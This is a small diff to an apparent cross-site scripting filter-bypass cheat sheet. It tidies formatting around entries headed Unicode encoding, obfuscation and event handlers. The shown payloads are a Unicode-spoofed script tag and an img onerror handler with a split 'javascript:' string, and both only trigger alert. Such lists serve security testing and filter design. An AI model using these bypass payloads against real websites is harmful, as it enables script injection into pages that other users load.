@@ -148,10 +148,7 @@ Bypass Tags:
 Using Unicode Encoding:
         <scrİpt>alert('XSS')</scrİpt>
 Using Obfuscation:
-
-html
-Copy code
-<img src=x onerror='javasc'+'ript:alert("XSS")'>
+        <img src=x onerror='javasc'+'ript:alert("XSS")'>
 Using Event Handlers:
 
 html
